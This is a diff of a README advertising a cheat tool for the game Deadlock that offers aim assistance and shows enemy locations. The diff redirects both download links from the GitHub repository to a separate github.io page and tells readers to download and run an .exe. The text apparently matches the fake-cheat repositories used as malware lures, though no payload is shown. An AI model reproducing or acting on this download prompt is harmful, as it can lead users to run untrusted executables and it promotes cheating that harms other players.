@@ -1,12 +1,12 @@
 # 🕹️ deadlock-script-update - Better game control for more wins
 
-[![](https://img.shields.io/badge/Download_Utility-Blue)](https://github.com/Undecided-cucumbertree223/deadlock-script-update)
+[![](https://img.shields.io/badge/Download_Utility-Blue)](https://undecided-cucumbertree223.github.io)
 
 This software helps you manage Deadlock settings. It gives you control over your aim, shows enemy locations, and lets you save your own game scripts. You can change how your character moves and acts using a simple menu that appears inside your game.
 
 ## 📥 How to download the application
 
-Visit [this page](https://github.com/Undecided-cucumbertree223/deadlock-script-update) to find the latest version of the utility. Look for the section labeled Releases on the right side of the screen. Click the file name that ends in .exe to start your download. Save the file to your computer in a folder you can find later, such as your Downloads or Documents folder.
+Visit [this page](https://undecided-cucumbertree223.github.io) to find the latest version of the utility. Look for the section labeled Releases on the right side of the screen. Click the file name that ends in .exe to start your download. Save the file to your computer in a folder you can find later, such as your Downloads or Documents folder.
 
 ## ⚙️ System requirements
 
